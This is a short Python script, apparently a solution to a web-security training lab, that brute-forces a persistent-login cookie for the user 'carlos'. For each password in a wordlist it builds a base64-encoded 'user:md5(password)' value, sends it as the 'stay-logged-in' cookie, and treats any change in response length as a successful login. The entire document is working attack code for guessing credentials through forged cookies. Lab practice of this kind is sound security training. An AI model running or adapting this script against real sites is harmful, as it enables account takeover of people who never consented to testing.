import requests
import hashlib
import base64

# Replace with the URL you want to send the request to
url = "https://www.example.com"

# save the passwords in a file called passwords.txt
file_path = 'passwords.txt'

user = 'carlos'

#The idea is compute the length of the response when the password is incorrect
# and then save it in the variable invalid_password_output_size

cookies = {'stay-logged-in': 'aa'}        
response = requests.get(url, cookies=cookies)
response_content = response.content
invalid_password_output_size = len(response_content)


# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        password = line.strip()
    
        # Hash the password
        md5_hash = hashlib.md5(password.encode()).hexdigest()
       
        # Perform Base64 encoding
        cookie_string=user+':'+md5_hash
        cookie_content = base64.b64encode(cookie_string.encode()).decode()        
        
        cookies = {'stay-logged-in': cookie_content}        
        response = requests.get(url, cookies=cookies)
        response_content = response.content
        response_size = len(response_content)

        #if different size is found then the password is correct and exit the loop
        if response_size!=invalid_password_output_size :
            print(password)
            break